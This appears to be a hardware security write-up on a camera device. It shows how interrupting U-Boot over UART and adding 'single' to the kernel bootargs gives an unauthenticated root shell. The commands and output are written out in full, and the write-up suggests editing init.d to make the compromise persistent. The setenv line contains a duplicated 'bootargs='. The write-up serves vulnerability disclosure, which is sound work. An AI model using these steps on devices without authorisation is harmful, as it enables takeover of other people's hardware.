# Boot Parameter Manipulation via U-Boot

## Overview

During bootloader analysis, U-Boot environment variables were inspected.
The `bootargs` variable controls Linux kernel startup paramaters.

The U-Boot shell allows modification of this variable through the `setenv` command.
By modifying this variable, the device's system initialization behavior can be altered.

## Original Bootargs

```
uboot # printenv
baudrate=115200
bootargs=mem=107M console=ttyS0,115200n8 loglevel=8 earlycon=uart8250,mmio32,0x4880000 board_id=0,boot_reason=0x0 root=/dev/axramdisk rw rootfstype=ext2 init=/linuxrc mtdparts=spi4.0:1M(spl),512K(ddrinit),2048K(uboot),512K(env),6M(calibration),1M(cliinfo),8M(config),1M(runtime),6M(cfgbak),7M(kernel),512K(update),94M(program),-(other)
bootcmd=axera_boot
bootdelay=2
bootfile=uImage
ethaddr=e4:f1:4c:77:66:ba
fdtcontroladdr=4fbae688
ipaddr=192.168.0.13
netmask=255.255.255.0
serverip=192.168.0.10
stderr=serial
stdin=serial
stdout=serial

Environment size: 555/524284 bytes
```

## Modification

Set the Linux kernel parameter to single-user mode by adding the `single` bootarg:

```
uboot # setenv bootargs bootargs=mem=107M console=ttyS0,115200n8 loglevel=8 earlycon=uart8250,mmio32,0x4880000 board_id=0,boot_reason=0x0 root=/dev/axramdisk rw rootfstype=ext2 init=/linuxrc single mtdparts=spi4.0:1M(spl),512K(ddrinit),2048K(uboot),512K(env),6M(calibration),1M(cliinfo),8M(config),1M(runtime),6M(cfgbak),7M(kernel),512K(update),94M(program),-(other)
uboot # boot
```

## Result

System booted directly into a root shell:

```
root@(none):~# id
uid=0(root) gid=0(root)
```

Full filesystem access available.

## Restriction

Achieving this root shell through the U-Boot interrupt essentially provides access to a recover environment.
The camera software is not running and the program partition has not yet been mounted.
However, utilizing this root shell it may be possible to modify `init.d` to achieve a root shell on the device during normal boot with full firmware running.

## Security Implications

The ability to modify `bootargs` through the unauthenticated U-Boot shell poses a significant security concern.
This enables privilege escalation to root without the need for credentials.

Impact:

- Bypass of authentication mechanisms
- Full filesystem access
- Potential for firmware modification
- Persistent compromise possible

Threat Model:
Requires physical access to UART interface.
